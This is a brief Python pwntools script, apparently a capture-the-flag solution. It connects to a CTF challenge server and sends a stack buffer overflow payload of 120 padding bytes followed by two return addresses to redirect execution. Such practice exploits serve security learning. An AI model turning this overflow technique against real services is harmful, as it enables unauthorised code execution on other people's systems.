from pwn import *

p = remote('01.linux.challenges.ctf.thefewchosen.com', 51814)

p.recv()

payload = b'A'*120
payload += p64(0x40101a)
payload += p64(0x4011b6)
with open('payload', 'wb') as f:
    f.write(payload)
p.sendline(payload)
print(p.recv())
